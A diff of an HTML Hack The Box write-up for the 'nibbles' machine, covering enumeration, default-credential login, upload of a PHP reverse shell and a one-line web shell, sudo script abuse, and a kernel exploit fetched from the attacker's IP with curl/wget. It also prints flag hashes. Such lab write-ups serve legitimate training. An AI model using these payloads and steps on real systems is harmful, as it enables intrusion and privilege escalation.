@@ -7,36 +7,69 @@
 </head>
 <body><div class="main"><div class="tree">
 <p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
-<p><a href="HacktheBox--Linux_Boxes--nibbles.html">nibbles</a></p>
+<p><a href="#nibbles">nibbles</a></p>
 
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--nmap.html">nmap</a></li>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--http.html">http</a></li>
+<li><a href="#nmap">nmap</a></li>
+<li><a href="#http">http</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--http--gobuster.html">gobuster</a></li>
+<li><a href="#gobuster">gobuster</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--http--gobuster---admin.html">/admin</a></li>
+<li><a href="#/admin">/admin</a></li>
 </ol>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--initial_foothold.html">initial foothold</a></li>
+<li><a href="#initial foothold">initial foothold</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--initial_foothold--default_credentials_to_nibbleblog_admin.html">default credentials to nibbleblog admin</a></li>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--initial_foothold--upload_pic.html">upload pic</a></li>
+<li><a href="#default credentials to nibbleblog admin">default credentials to nibbleblog admin</a></li>
+<li><a href="#upload pic">upload pic</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--initial_foothold--upload_pic--OR_upload_cmd.php_for_RCE.html">OR upload cmd.php for RCE</a></li>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--initial_foothold--upload_pic--reverse_shell.html">reverse shell</a></li>
+<li><a href="#OR upload cmd.php for RCE">OR upload cmd.php for RCE</a></li>
+<li><a href="#reverse shell">reverse shell</a></li>
 </ol>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--privesc_through_monitor.sh_file_creation.html">privesc through monitor.sh file creation</a></li>
+<li><a href="#privesc through monitor.sh file creation">privesc through monitor.sh file creation</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--privesc_through_monitor.sh_file_creation--vi_monitor.sh.html">vi monitor.sh</a></li>
+<li><a href="#vi monitor.sh">vi monitor.sh</a></li>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--priv_esc_through_rationallove_kernel_exploit.html">priv esc through rationallove kernel exploit </a></li>
+<li><a href="#priv esc through rationallove kernel exploit">priv esc through rationallove kernel exploit </a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--priv_esc_through_rationallove_kernel_exploit--rationallove.c.html">rationallove.c</a></li>
+<li><a href="#rationallove.c">rationallove.c</a></li>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--user-root.html">user/root</a></li>
-<li><a href="HacktheBox--Linux_Boxes--nibbles--lessons_learned.html">lessons learned</a></li>
+<li><a href="#user/root">user/root</a></li>
+<li><a href="#lessons learned">lessons learned</a></li>
 </ol></div>
-<div class="page"><h1><b><u>nibbles</u></b></h1><img src="images/23-1.png" alt="images/23-1.png" /><br /><img src="images/23-2.png" alt="images/23-2.png" /></div></div>
+
+<div class="page", id="nibbles"><h1><b><u>nibbles</u></b></h1><img src="images/23-1.png" alt="images/23-1.png" /><br /><img src="images/23-2.png" alt="images/23-2.png" /></div>
+
+<div class="page", id="nmap"><h1><b><u>nmap</u></b></h1><span style="color:#ffa500;">nmap -sV -sC -oA nibbles 10.10.10.75</span><br /><img src="images/24-1.png" alt="images/24-1.png" /></div>
+
+<div class="page", id="http"><h1><b><u>http</u></b></h1><img src="images/1952-1.png" alt="images/1952-1.png" /><br /><br /><img src="images/1952-2.png" alt="images/1952-2.png" /><span style="color:#24ff00;"><br />this is why its always worth checking the source code of the websites we're enumerating,<br />lets look at what </span><img src="images/1952-3.png" alt="images/1952-3.png" /> has</div>
+
+<div class="page", id="gobuster"><h1><b><u>gobuster</u></b></h1><img src="images/1644-1.png" alt="images/1644-1.png" /></div>
+
+<div class="page", id="/admin"><h1><b><u>/admin</u></b></h1><img src="images/2021-1.png" alt="images/2021-1.png" /></div>
+
+<div class="page", id="initial foothold"><h1><b><u>initial foothold</u></b></h1></div>
+
+<div class="page", id="default credentials to nibbleblog admin"><h1><b><u>default credentials to nibbleblog admin</u></b></h1><span style="color:#24ff00;">trying username </span><span style="color:#ffff00;">admin</span><span style="color:#24ff00;"> and password </span><span style="color:#ffff00;">nibbles</span><span style="color:#24ff00;"> default credentials logs us in</span><br /><br /><span style="color:#24ff00;">we can also brute force the password with </span><span style="color:#ffa500;">hydra/intruder </span><br /><img src="images/25-1.png" alt="images/25-1.png" /></div>
+
+<div class="page", id="upload pic"><h1><b><u>upload pic</u></b></h1><img src="images/27-1.png" alt="images/27-1.png" /><br /><br /><span style="color:#24ff00;">upload our php reverse shell script from our </span><span style="color:#ffff00;">/opt/shell </span><span style="color:#24ff00;">directory and change the parameters to call back to our machine</span><br /><br /><span style="color:#ffff00;">(You can Ignore the warnings when you upload the file)</span><br /><img src="images/27-2.png" alt="images/27-2.png" /><br /><img src="images/27-3.png" alt="images/27-3.png" /><br /><br /><br /><br /><img src="images/27-4.png" alt="images/27-4.png" /><br /><br /><span style="color:#24ff00;">Next navigate to the location where the script is stored so the webpage runs it</span><br /><br /><img src="images/27-5.png" alt="images/27-5.png" /><br /></div>
+
+<div class="page", id="OR upload cmd.php for RCE"><h1><b><u>OR upload cmd.php for RCE</u></b></h1><span style="color:#24ff00;">we can also upload a system call written in php to get remote code execution on the server </span><br /><br /><span style="color:#ffa500;">&lt;php echo system($_REQUEST['cmd']) ?&gt;</span><br /><img src="images/1645-1.png" alt="images/1645-1.png" /><br /><br /><br /><img src="images/1645-2.png" alt="images/1645-2.png" /><br /><br /><span style="color:#24ff00;">run the script through the browser and we have code execution</span><br /><img src="images/1645-3.png" alt="images/1645-3.png" /><br /></div>
+
+<div class="page", id="reverse shell"><h1><b><u>reverse shell</u></b></h1><img src="images/26-1.png" alt="images/26-1.png" /><br /><img src="images/26-2.png" alt="images/26-2.png" /></div>
+
+<div class="page", id="privesc through monitor.sh file creation"><h1><b><u>privesc through monitor.sh file creation</u></b></h1><span style="color:#24ff00;">Lets run </span><span style="color:#ffa500;">sudo -l</span><span style="color:#24ff00;"> and see what functions we can call as sudo without a password:<br /><br /><img src="images/29-1.png" alt="images/29-1.png" /><br /><br />Seems there is a file called </span><span style="color:#ffa500;">monitor.sh </span><span style="color:#24ff00;">that we can call as root without a password, lets see what it is...<br /><br /></span><img src="images/29-2.png" alt="images/29-2.png" /><br /><br /><br /></div>
+
+<div class="page", id="vi monitor.sh"><h1><b><u>vi monitor.sh</u></b></h1><img src="images/713-1.png" alt="images/713-1.png" /><span style="color:#24ff00;"><br /><br />lets make our script executable with chmod and run it as </span><span style="color:#ffff00;">root<span style="color:#24ff00;">:<br /></span><img src="images/713-2.png" alt="images/713-2.png" /><br /><br />Success!</span></div>
+
+<div class="page", id="priv esc through rationallove kernel exploit"><h1><b><u>priv esc through rationallove kernel exploit </u></b></h1><span style="color:#24ff00;">copy raw data from<span style="color:#ffa500;">rationallove/gitlibc<br /><img src="images/30-1.png" alt="images/30-1.png" /><br /><br /><br />vi rationallove.c</span> -&gt; paste raw <br /><br /><br />setup httpserver<br /><img src="images/30-2.png" alt="images/30-2.png" /><br /><br />-as nibbles: <span style="color:#ffa500;">curl -o &lt;filename.c&gt; rationallove.c 10.10.14.62:&lt;httpserverport&gt;/rationallove.c </span><span style="color:#24ff00;"><br />or <br /></span><span style="color:#ffa500;">wget 10.10.14.62:5555/rationallove.c</span><br /><img src="images/30-3.png" alt="images/30-3.png" /><br /><img src="images/30-4.png" alt="images/30-4.png" /><br /><br /><br />and compile it on the victim machine<br /><span style="color:#ffa500;">gcc -o &lt;exefilename&gt; &lt;filename.c&gt;</span><br /><img src="images/30-5.png" alt="images/30-5.png" /><br /><br />run <span style="color:#ffa500;">./&lt;exefilename&gt; </span><br /><img src="images/30-6.png" alt="images/30-6.png" /><br /><br /><img src="images/30-7.png" alt="images/30-7.png" /><br /><span style="color:#ffff00;">root</span></span></div>
+
+<div class="page", id="rationallove.c"><h1><b><u>rationallove.c</u></b></h1><span style="color:#24ff00;">its 977 lines of code so I'm not gonna paste it all here, look it up if you'd like here<br /> <a href="https://www.exploit-db.com/exploits/43775">https://www.exploit-db.com/exploits/43775</a><h2><br /> <br /><br /></h2><img src="images/714-1.png" alt="images/714-1.png" /></span></div>
+
+<div class="page", id="user/root"><h1><b><u>user/root</u></b></h1><img src="images/28-1.png" alt="images/28-1.png" /><span style="color:#ffff00;"><br />b02ff32bb332deba49eeaed21152c8d8<br /><img src="images/28-2.png" alt="images/28-2.png" /><br /> b6d745c0dfb6457c55591efc898ef88c </span></div>
+
+<div class="page", id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br /><br /><img src="images/1953-1.png" alt="images/1953-1.png" /></div>
+
+</div>
 </body></html>
